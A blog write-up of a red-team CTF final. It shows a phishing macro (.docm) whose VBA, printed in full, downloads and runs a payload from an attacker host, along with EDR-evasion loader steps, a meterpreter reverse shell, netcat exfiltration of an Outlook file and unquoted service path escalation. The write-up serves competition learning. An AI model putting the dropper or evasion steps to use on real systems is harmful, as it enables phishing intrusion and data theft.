---
title: "ABC CTF Challenge"
date: 2021-08-28T03:09:07-03:00
draft: false
cover: "images/abcctf/2021_cybersecurity.jpeg"
blogs: ["CTF_Challenges"]
---


> medium-to-markdown@0.0.3 convert
> node index.js "https://cyberrat.medium.com/abc-cyberhackathon-redteam-ctf-43bddc822241"

![](https://miro.medium.com/max/1400/1*NINvpcA8Z478bBNm4FxTCg.jpeg)

ABC CyberHackathon RedTeam CTF
==============================

[![CY3ER-R4T](https://miro.medium.com/fit/c/56/56/1*OmV3HIyQWlvcOSNAAU7uOQ.png)](https://medium.com/?source=post_page-----43bddc822241--------------------------------)[

CY3ER-R4T

](https://medium.com/?source=post_page-----43bddc822241--------------------------------)[

Just now·6 min read

](https://medium.com/abc-cyberhackathon-redteam-ctf-43bddc822241?source=post_page-----43bddc822241--------------------------------)

**INTRODUCTION**

My team RedTeamNG recently came first in the The American Business Council Cybersecurity Hackathon 2021 organized by ctf.ng and major sponsors bothering from American Business Council,Microsoft,AWS, Cisco, Comercio, HP, IBM and others

This write up would be focused only on the finals and specifically the RedTeam challenges running through the methodology used to tackling it,  
other post by my team mate [Muzec](https://medium.com/u/c9e9bd44299d?source=post_page-----43bddc822241--------------------------------) would be covering the Web Challenges.

**SCENARIO**

The scenario we are presented with by the organizers is that of an Fat Fingered individual that unconsciously opens every email and attachment he gets in he’s corporate email : [obiora\_nurudeen@ctf.ng](http://mailto:obiora_nurudeen@ctf.ng)

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/998/1\*VH4PvxhXVzuTjA5HgwUeyQ.png" width="499" height="141" srcSet="https://miro.medium.com/max/552/1\*VH4PvxhXVzuTjA5HgwUeyQ.png 276w, https://miro.medium.com/max/998/1\*VH4PvxhXVzuTjA5HgwUeyQ.png 499w" sizes="499px" role="presentation"/>

Armed with just he’s name Nurudeen Obiora, the email above and the knowledge of the targets low awareness in basic email security,  
we thought of emulating a strategy we recently used at the DEFCON 29 RedTeam CTF by sending the target an email with the reverse shell payload attached.

Now here is where the problem begins, as with almost every field: There is a race, race between Good and Bad, Positive and Negative  
our intentions are of no good so every mechanism of security is against us which is a “replica” of a real life situation

**1st attempt:** _Sending an msfvenom payload + gmail_  
Using msfvenom we created a windows reverse shell payload

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*j0QEuDMMu6OwCf0e2C34-w.gif" width="700" height="105" srcSet="https://miro.medium.com/max/552/1\*j0QEuDMMu6OwCf0e2C34-w.gif 276w, https://miro.medium.com/max/1104/1\*j0QEuDMMu6OwCf0e2C34-w.gif 552w, https://miro.medium.com/max/1280/1\*j0QEuDMMu6OwCf0e2C34-w.gif 640w, https://miro.medium.com/max/1400/1\*j0QEuDMMu6OwCf0e2C34-w.gif 700w" sizes="700px" role="presentation"/>

Attempting to send it to the target using swaks  
swaks : SWiss Army Knife Smtp

we are immediately flagged as malicious by Gmails Egress Malware Scanner

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/954/1\*IPclkzRk5eEq\_NkTrDuMlg.gif" width="477" height="248" srcSet="https://miro.medium.com/max/552/1\*IPclkzRk5eEq\_NkTrDuMlg.gif 276w, https://miro.medium.com/max/954/1\*IPclkzRk5eEq\_NkTrDuMlg.gif 477w" sizes="477px" role="presentation"/>

**2st attempts:** We resulted into trying several empire powershell payload and bypasses, Persian Hydra Xor encryption with Custom keys, EgeBalci/sgn Shikata\_ga\_nai encoder, All to no avail

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/630/0\*Zcu3vY8HCJ68orks" width="315" height="210" srcSet="https://miro.medium.com/max/552/0\*Zcu3vY8HCJ68orks 276w, https://miro.medium.com/max/630/0\*Zcu3vY8HCJ68orks 315w" sizes="315px" role="presentation"/>

**Final attempt:** After numerous swift and failed attempt, we remembered Matthew Eidelberg talk at SourceZero Con : Remaining Invisible in the Age of EDR, a talk which showcase the ability to bypass defenses with a term called DLL unhooking using the ScareCrow Binary

In short, we can generate some raw shellcode from the software of our choice (Cobalt Strike, Metasploit, PoshC2, etc) and pass it to the Scarecrow to get a loader back that will implement some common EDR evasion techniques.

we decide to create a create a _windows/x64/meterpreter\_reverse\_tcp_ shellcode using msfvenom \[msfvenom shellcode is a pain, its crappy and might be unstable at times\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*6ty3CRErj9mZyRSrScb3bQ.png" width="700" height="153" srcSet="https://miro.medium.com/max/552/1\*6ty3CRErj9mZyRSrScb3bQ.png 276w, https://miro.medium.com/max/1104/1\*6ty3CRErj9mZyRSrScb3bQ.png 552w, https://miro.medium.com/max/1280/1\*6ty3CRErj9mZyRSrScb3bQ.png 640w, https://miro.medium.com/max/1400/1\*6ty3CRErj9mZyRSrScb3bQ.png 700w" sizes="700px" role="presentation"/>

then pass the raw shellcode to the scarecrow binary along with a random domain name for a cloned signed certificate

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*5R2sbN-yg375oOl0VON5XA.png" width="700" height="358" srcSet="https://miro.medium.com/max/552/1\*5R2sbN-yg375oOl0VON5XA.png 276w, https://miro.medium.com/max/1104/1\*5R2sbN-yg375oOl0VON5XA.png 552w, https://miro.medium.com/max/1280/1\*5R2sbN-yg375oOl0VON5XA.png 640w, https://miro.medium.com/max/1400/1\*5R2sbN-yg375oOl0VON5XA.png 700w" sizes="700px" role="presentation"/>

we then created a meterpreter listener using the connection variable of the shellcode as options: “would have preferred Cobalt-strike but its for the BigBoys like Rotimi:)”

**DELIVERY**

The output of ScareCrow is an obfuscated .exe payload, being at the third stage of the “cyber attack cycle” which is delivery  
we somehow need to get the payload the victim machine and “run” it

We decided to use the old aged Microsoft Office Document with macro with the .docm extension,  
the function of the macro was to run a powershell one-liner that downloads the payload \[Powerpnt.exe\] binary hosted on our machine, store it in C:\\windows\\temp\\ and then run it

> Sub Document\_Open()  
> MyMacro  
> End Sub
> 
> Sub AutoOpen()  
> MyMacro  
> End Sub
> 
> Sub MyMacro()  
> Dim str As String  
> str = “powershell iwr -uri [http://x.x.x.x/](http://20.87.43.15/OutLook.exe)Powerpnt.exe -o c:\\windows\\temp\\Powerpnt.exe; c:\\windows\\temp\\Powerpnt.exe”  
> GetObject**(**“winmgmts:”**)**.Get**(**“Win32\_Process”**)**.Create str, Null, Null, pid  
> Shell str, vbHide  
> End Sub

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*IbMXTl0ZG0RSjTf11DHdDw.png" width="700" height="243" srcSet="https://miro.medium.com/max/552/1\*IbMXTl0ZG0RSjTf11DHdDw.png 276w, https://miro.medium.com/max/1104/1\*IbMXTl0ZG0RSjTf11DHdDw.png 552w, https://miro.medium.com/max/1280/1\*IbMXTl0ZG0RSjTf11DHdDw.png 640w, https://miro.medium.com/max/1400/1\*IbMXTl0ZG0RSjTf11DHdDw.png 700w" sizes="700px" role="presentation"/>

**WEAPONIZATION**

Weaponized the final email and sent the .docm to the target by gmail

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1208/1\*TKr7A70GztwtX07C82OWrA.png" width="604" height="610" srcSet="https://miro.medium.com/max/552/1\*TKr7A70GztwtX07C82OWrA.png 276w, https://miro.medium.com/max/1104/1\*TKr7A70GztwtX07C82OWrA.png 552w, https://miro.medium.com/max/1208/1\*TKr7A70GztwtX07C82OWrA.png 604w" sizes="604px" role="presentation"/>

Tick! tock! Tick! tock!  
Itchy finger Nurudeen opens the malicious document with the payload sending us a meterpreter session on our VPS \[wish it was cobalt strike, somebody buy us cobalt strike already!!\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*Z1ukXkqWNSyP1qqH6o3MYA.png" width="700" height="92" srcSet="https://miro.medium.com/max/552/1\*Z1ukXkqWNSyP1qqH6o3MYA.png 276w, https://miro.medium.com/max/1104/1\*Z1ukXkqWNSyP1qqH6o3MYA.png 552w, https://miro.medium.com/max/1280/1\*Z1ukXkqWNSyP1qqH6o3MYA.png 640w, https://miro.medium.com/max/1400/1\*Z1ukXkqWNSyP1qqH6o3MYA.png 700w" sizes="700px" role="presentation"/>

Now the hunt for flags begin, which literally means _ENUMERATION_  
checking to see what the internal IP looks like, we find the user IP address we we already solved the unintended way by checking the header of the response email\[FLAG8\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*FqQt4Z0E2Bl16ezFE3ICzA.png" width="700" height="186" srcSet="https://miro.medium.com/max/552/1\*FqQt4Z0E2Bl16ezFE3ICzA.png 276w, https://miro.medium.com/max/1104/1\*FqQt4Z0E2Bl16ezFE3ICzA.png 552w, https://miro.medium.com/max/1280/1\*FqQt4Z0E2Bl16ezFE3ICzA.png 640w, https://miro.medium.com/max/1400/1\*FqQt4Z0E2Bl16ezFE3ICzA.png 700w" sizes="700px" role="presentation"/>

checking the current user directory and finding unattend.xml that contains \[FLAG4\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/700/1\*VqSsSivoOt9NwC\_ePCi8\_Q.jpeg" width="350" height="105" srcSet="https://miro.medium.com/max/552/1\*VqSsSivoOt9NwC\_ePCi8\_Q.jpeg 276w, https://miro.medium.com/max/700/1\*VqSsSivoOt9NwC\_ePCi8\_Q.jpeg 350w" sizes="350px" role="presentation"/>

curious about what local users are on the machine just to get an idea of what movement of privilege escalation was necessary, lateral or horizontal  
we find two more flags \[FLAG3\] \[FLAG5\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1246/1\*vg5Z2a0dhrRJaUU9QgcT2g.jpeg" width="623" height="670" srcSet="https://miro.medium.com/max/552/1\*vg5Z2a0dhrRJaUU9QgcT2g.jpeg 276w, https://miro.medium.com/max/1104/1\*vg5Z2a0dhrRJaUU9QgcT2g.jpeg 552w, https://miro.medium.com/max/1246/1\*vg5Z2a0dhrRJaUU9QgcT2g.jpeg 623w" sizes="623px" role="presentation"/>

One of the challenges goes by the name “Registry Never Lies” which immediately prompted us to query the registry table to find \[FLAG2\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1300/1\*s1enEoTLfxjdLgHSuGkT7A.jpeg" width="650" height="137" srcSet="https://miro.medium.com/max/552/1\*s1enEoTLfxjdLgHSuGkT7A.jpeg 276w, https://miro.medium.com/max/1104/1\*s1enEoTLfxjdLgHSuGkT7A.jpeg 552w, https://miro.medium.com/max/1280/1\*s1enEoTLfxjdLgHSuGkT7A.jpeg 640w, https://miro.medium.com/max/1300/1\*s1enEoTLfxjdLgHSuGkT7A.jpeg 650w" sizes="650px" role="presentation"/>

The what seems to be easy challenge turned to a battle “Outlook Storage 150points”, as most application data are stored in %APPDATA% we dived into it to get our hands on the loot after a quick research we figure the ost file is the microsoft outlook data bucket trying to transfer the file using the netcat binary, it failed cause the file was currently locked with the outlook process.

We proceeded to killing the process and sending the OST to our local machine with netcat

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/960/1\*LrVqRgG\_TdQjOuvqyFyfdQ.jpeg" width="480" height="64" srcSet="https://miro.medium.com/max/552/1\*LrVqRgG\_TdQjOuvqyFyfdQ.jpeg 276w, https://miro.medium.com/max/960/1\*LrVqRgG\_TdQjOuvqyFyfdQ.jpeg 480w" sizes="480px" role="presentation"/>

Converting the ost with the steller converter we find \[FLAG1\]

<img alt="" class="fd ej ef eo w" src="https://miro.medium.com/max/1400/1\*lMXJErgzKx\_38NUoPJ-niw.png" width="700" height="490" srcSet="https://miro.medium.com/max/552/1\*lMXJErgzKx\_38NUoPJ-niw.png 276w, https://miro.medium.com/max/1104/1\*lMXJErgzKx\_38NUoPJ-niw.png 552w, https://miro.medium.com/max/1280/1\*lMXJErgzKx\_38NUoPJ-niw.png 640w, https://miro.medium.com/max/1400/1\*lMXJErgzKx\_38NUoPJ-niw.png 700w" sizes="700px" role="presentation"/>

After running out of flags to find, it was time for horizontal privilege escalation

**LATERAL PRIVILEGE ESCALATION  
Machine Misconfigured with an Unquoted Service Path**

Sometimes it is possible to escalate privileges by abusing mis-configured services. Specifically, this is possible if path to the service binary is not wrapped in quotes and there are spaces in the path..  
If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.

For example, consider the string “c:\\program files\\safe software\\enjoy.exe”. This string can be interpreted in a number of ways.  
The system tries to interpret the possibilities in the following order:

**c:\\program.exe**  
**c:\\program files\\safe.exe**  
**c:\\program files\\safe software\\enjoy.exe**

if any of the directory along the path is writable and said service is running with system privileges then this misconfiguration is easily exploitable

we can enumerate and find Unquoted Service Path by using the wmic command “wmic service get name,pathname”

we can aswell check to see if the service is running with system privileges still by using wmic “wmic service get pathname,startname”

> **END OF PART ONE**
